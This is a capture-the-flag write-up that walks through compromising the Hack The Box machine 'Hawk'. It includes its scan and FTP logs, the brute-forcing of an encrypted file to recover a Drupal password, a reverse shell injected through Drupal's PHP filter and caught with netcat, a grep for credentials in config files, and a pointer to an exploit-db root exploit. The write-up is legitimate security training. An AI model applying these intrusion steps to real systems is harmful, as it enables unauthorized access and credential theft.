# Hawk writeups by Seyptoo.

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543657344-capture-du-2018-12-01-10-41-55.png)](https://hackthebox.eu/)

Informations
----
    Ip : 10.10.10.102       Created : mrh4sh
    Level : Easy            Base Points : 30
    
Nmap Scan
----
**We have 4 open ports, 21, 22, 80 and 8082.**
The 21 is for the FTP server, 22 for the SSH server, for the 80 HTTTP server (Drupal CMS) and finally for the 8082 for the 
database.

    root@Seyptoo:~/writeup/hawk# nmap -A -sT -p 1-65535 -oA nmap/hawk 10.10.10.102 -v
    Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-01 10:50 CET
    NSE: Loaded 132 scripts for scanning.
    NSE: Script Pre-scanning.
    Initiating NSE at 10:50
    Completed NSE at 10:50, 0.00s elapsed
    Initiating NSE at 10:50
    Completed NSE at 10:50, 0.00s elapsed
    Initiating Ping Scan at 10:50
    Scanning 10.10.10.102 [4 ports]
    Completed Ping Scan at 10:50, 0.22s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 10:50
    Completed Parallel DNS resolution of 1 host. at 10:50, 0.00s elapsed
    Initiating Connect Scan at 10:50
    Scanning 10.10.10.102 [65535 ports]
    Discovered open port 21/tcp on 10.10.10.102
    Discovered open port 22/tcp on 10.10.10.102
    Discovered open port 80/tcp on 10.10.10.102
    Discovered open port 8082/tcp on 10.10.10.102
    
Check Version
----
[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543658376-capture-du-2018-12-01-10-59-23.png)](https://hackthebox.eu)
**We can see that we have 2 HTTP 
servers and an FTP server which we can 
access anonymously.**

FTP Access and transfert
----
**We have access to the FTP server, we can see that there is a hidden file and we transfer it to our physical machine.**
The file this name .drupal.txt.enc, it is probably a password to access the CMS drupal. :)

    root@Seyptoo:~/writeup/hawk# ftp 10.10.10.102
    Connected to 10.10.10.102.
    220 (vsFTPd 3.0.3)
    Name (10.10.10.102:root): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 messages
    226 Directory send OK.
    ftp> cd messages
    250 Directory successfully changed.
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    226 Directory send OK.
    ftp> ls -alv
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    drwxr-xr-x    2 ftp      ftp          4096 Jun 16 22:21 .
    drwxr-xr-x    3 ftp      ftp          4096 Jun 16 22:14 ..
    -rw-r--r--    1 ftp      ftp           240 Jun 16 22:21 .drupal.txt.enc
    226 Directory send OK.
    ftp> mget .drupal.txt.enc
    mget .drupal.txt.enc? 
    200 PORT command successful. Consider using PASV.
    150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).
    226 Transfer complete.
    240 bytes received in 0.00 secs (513.9802 kB/s)
    ftp> 

Cracking file
----
Everything is encrypted, we will use a tool to crack this file.

    root@Seyptoo:~/writeup/hawk# cat .drupal.txt.enc 
    U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb
    CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz
    QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy
    t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=
    root@Seyptoo:~/writeup/hawk# cat .drupal.txt.enc|base64 -d
    Salted__kY ԓi-6�l���7Z����>{�$�p����5 �2[
    ���������8?�sW�j#T$3AG�,f	���Z\ja�>>G6
    �.��E���ÐV��V@�����ɗ���4�����@�w�xZ��Ni��PtF��`)
    root@Seyptoo:~/writeup/hawk#
The file is in base64, we are going to the tools on github.

    root@Seyptoo:~/writeup/hawk# git clone https://github.com/deltaclock/go-openssl-bruteforce.git
    Clonage dans 'go-openssl-bruteforce'...
    remote: Enumerating objects: 31, done.
    remote: Total 31 (delta 0), reused 0 (delta 0), pack-reused 31
    Dépaquetage des objets: 100% (31/31), fait.
    Vérification de la connectivité... fait.
    root@Seyptoo:~/writeup/hawk# cd go-openssl-bruteforce/
    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# ls
    brute.go  openssl-brute  README.md
    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# ./openssl-brute -file ../drupal.txt.enc
    Bruteforcing Started
    CRACKED!! Results in file [ result-aes256 ]
    --------------------------------------------------
    Found password [ friends ] using [ aes256 ] algorithm!!
    --------------------------------------------------
    Daniel,

    Following the password for the portal:

    "PencilKeyboardScanner123"

    Please let us know when the portal is ready.

    Kind Regards,

    IT department

    --------------------------------------------------
The password has been cracked successfully, so we can connect to the CMS (drupal).

Website reverse shell
----
Try a default user, like admin and it should do the trick to connect to the CMS.
> User : **admin**<br/>
Password : **PencilKeyboardScanner123**

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543661418-capture-du-2018-12-01-11-50-07.png)](https://hackthebox.eu)

Once you are logged in you have to go to modules, and activate **PHP filter**.<br/>
Once you have activated the module go to **Content, add content, Basic page, and put your PHP code**, go take the code pentestmonkey. :)

AND BIM !!!

    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# nc -lvp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from [10.10.10.102] port 1234 [tcp/*] accepted (family 2, sport 48804)
    Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
     11:09:02 up 29 min,  2 users,  load average: 0.05, 0.02, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    daniel   pts/0    10.10.15.190     10:47    5:31   0.14s  0.14s -python3
    daniel   pts/2    10.10.15.190     11:04    4:13   0.03s  0.03s -python3
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ python3 -c "import pty;pty.spawn('/bin/bash')"
    www-data@hawk:/$ cd /home/daniel
    www-data@hawk:/home/daniel$ cat user.txt
    d5111d4f75370ebd01cd**********
    
We have to login in SSH, go to var /www/html/sites/default/
    
    www-data@hawk:/var/www/html/sites/default$ grep password -r .
    
[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543664102-capture-du-2018-12-01-12-31-37.png)](https://hackthebox.eu)

We have to connect in SSH, with user daniel.
Credentials SSH :
> Username : **daniel**<br/>
> Password : **drupal4hawk**

    root@Seyptoo:~/writeup/hawk/go-openssl-bruteforce# ssh daniel@10.10.10.102
    daniel@10.10.10.102's password: 
    Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

     * Documentation:  https://help.ubuntu.com
     * Management:     https://landscape.canonical.com
     * Support:        https://ubuntu.com/advantage

      System information as of Sat Dec  1 11:40:21 UTC 2018

      System load:  0.12              Processes:            125
      Usage of /:   54.1% of 9.78GB   Users logged in:      1
      Memory usage: 54%               IP address for ens33: 10.10.10.102
      Swap usage:   0%


     * Canonical Livepatch is available for installation.
       - Reduce system reboots and improve kernel security. Activate at:
         https://ubuntu.com/livepatch

    55 packages can be updated.
    3 updates are security updates.

    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


    Last login: Sat Dec  1 11:39:51 2018 from 10.10.13.26
    Python 3.6.5 (default, Apr  1 2018, 05:46:30) 
    [GCC 7.3.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import pty
    >>> pty.spawn('/bin/bash')
    daniel@hawk:~$ 
   
PrivEsc solutions
----
We will see the open services in the target machine

    daniel@hawk:/tmp$ netstat -lapt
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
    tcp        0      0 localhost.localdo:mysql 0.0.0.0:*               LISTEN      -                   
    tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
    tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      -                   
    tcp        0      0 hawk:ssh                10.10.15.190:46050      ESTABLISHED -                   
    tcp        0      0 hawk:50780              10.10.13.144:4444       ESTABLISHED -                   
    tcp        0      0 hawk:48804              10.10.13.26:1234        CLOSE_WAIT  -                   
    tcp        0      1 hawk:50294              4.2.2.2:domain          SYN_SENT    -                   
    tcp        0    612 hawk:ssh                10.10.13.26:54668       ESTABLISHED -                   
    tcp        0      0 localhost.localdo:46646 localhost.localdom:8082 TIME_WAIT   -                   
    tcp        0      0 hawk:ssh                10.10.15.190:46204      ESTABLISHED -                   
    tcp        0      0 localhost.localdo:46644 localhost.localdom:8082 TIME_WAIT   -                   
    tcp        0      1 hawk:50288              4.2.2.2:domain          SYN_SENT    -                   
    tcp        0      0 hawk:49006              10.10.13.26:1234        CLOSE_WAIT  -                   
    tcp6       0      0 [::]:9092               [::]:*                  LISTEN      -                   
    tcp6       0      0 [::]:http               [::]:*                  LISTEN      -                   
    tcp6       0      0 [::]:8082               [::]:*                  LISTEN      -                   
    tcp6       0      0 [::]:ftp                [::]:*                  LISTEN      -                   
    tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -                   
    tcp6       0      0 [::]:5435               [::]:*                  LISTEN      -                   
    tcp6       0      0 hawk:http               10.10.15.200:56196      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56190      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56186      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56202      ESTABLISHED -                   
    tcp6       0      0 hawk:http               10.10.15.200:56204      SYN_RECV    -                   
    tcp6       0      0 hawk:http               10.10.15.200:56194      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56198      TIME_WAIT   -                   
    tcp6       0      0 hawk:8082               10.10.15.200:36304      TIME_WAIT   -                   
    tcp6       1      0 hawk:http               10.10.13.26:34482       CLOSE_WAIT  -                   
    tcp6       0      0 hawk:http               10.10.15.200:56208      SYN_RECV    -                   
    tcp6       0      0 hawk:http               10.10.15.200:56192      TIME_WAIT   -                   
    tcp6       1      0 hawk:http               10.10.15.200:56086      CLOSE_WAIT  -                   
    tcp6       0      0 hawk:http               10.10.15.200:56200      TIME_WAIT   -                   
    tcp6       1      0 hawk:http               10.10.13.26:34850       CLOSE_WAIT  -                   
    tcp6       0      0 hawk:http               10.10.15.200:56178      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56170      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56180      TIME_WAIT   -                   
    tcp6       0      0 hawk:http               10.10.15.200:56206      SYN_RECV    -                   

We are going to exploit port 8082 you just have to install this tools to be root https://www.exploit-db.com/exploits/45506

[![forthebadge made-with-python](http://image.noelshack.com/fichiers/2018/48/6/1543665462-capture-du-2018-12-01-12-57-30.png)](https://hackthebox.eu)

